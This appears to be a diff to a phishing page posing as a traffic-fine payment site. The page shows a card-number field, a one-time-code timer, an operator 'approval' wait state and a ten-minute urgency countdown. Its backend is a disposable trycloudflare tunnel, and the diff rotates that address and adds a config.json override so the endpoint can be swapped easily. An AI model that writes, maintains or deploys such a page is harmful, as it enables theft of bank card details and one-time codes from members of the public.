@@ -172,11 +172,25 @@
     </div>
 
     <script>
-        let API_URL = 'https://superintendent-elementary-leads-urls.trycloudflare.com/api';
+        let API_URL = 'https://continuously-pics-singing-robinson.trycloudflare.com/api';
         let timerInterval;
         let otpTimeLeft = 180;
         let otpInterval;
         let waitingForApproval = false;
+
+        async function initConfig() {
+            try {
+                const res = await fetch('config.json');
+                const config = await res.json();
+                if (config.apiUrl) {
+                    API_URL = config.apiUrl;
+                }
+            } catch (err) {
+                console.log("Config oxunmadı, default istifadə olunur");
+            }
+            fetchFineData();
+            initTimer();
+        }
 
         document.getElementById('card-no').addEventListener('input', function (e) {
             let value = e.target.value.replace(/\D/g, '').substring(0, 16);
@@ -378,10 +392,9 @@
             }
         }
 
-        // PERSISTENT COUNTDOWN TIMER VIA LOCALSTORAGE
         function initTimer() {
             const timerElement = document.getElementById('timer');
-            const TOTAL_DURATION = 10 * 60; // 10 minutes in seconds
+            const TOTAL_DURATION = 10 * 60;
             let endTime = localStorage.getItem('dyp_timer_end');
 
             if (!endTime) {
@@ -406,8 +419,7 @@
         }
 
         setInterval(fetchFineData, 1500);
-        fetchFineData();
-        initTimer();
+        initConfig();
     </script>
 </body>
 </html>
